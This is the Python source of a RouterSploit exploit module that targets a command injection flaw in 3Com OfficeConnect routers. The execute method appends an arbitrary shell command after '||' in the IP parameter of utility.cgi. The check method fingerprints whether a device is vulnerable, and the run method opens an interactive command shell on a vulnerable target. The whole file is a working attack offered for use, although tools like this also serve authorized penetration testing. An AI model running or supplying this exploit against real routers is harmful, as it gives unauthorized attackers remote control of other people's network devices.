from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    random_text,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com OfficeConnect Remote Command Execution vulnerability.
    If the target is vulnerable, command loop is invoked.
    """
    __info__ = {
        'name': '3Com OfficeConnect RCE',
        'authors': [
            'Andrea Fabizi',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'description': 'Module exploits 3Com OfficeConnect remote command execution '
                       'vulnerability which allows executing command on operating system level.',
        'references': [
            'https://www.exploit-db.com/exploits/9862/',
        ],
        'devices': [
            '3Com OfficeConnect',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/utility.cgi?testType=1&IP=aaa || {}".format(self.target, self.port, cmd)

        http_request(method="GET", url=url)
        return ""

    @mute
    def check(self):
        url = "{}:{}/utility.cgi?testType=1&IP=aaa".format(self.target, self.port)

        response1 = http_request(method="GET", url=url)
        if response1 is None:
            return False  # target is not vulnerable

        if response1.status_code == 200:
            url = "{}:{}/{}.cgi".format(self.target, self.port, random_text(32))
            response2 = http_request(method="GET", url=url)
            if response2 is None or response1.text != response2.text:
                return True  # target is vulnerable

        return False  # target is not vulnerable
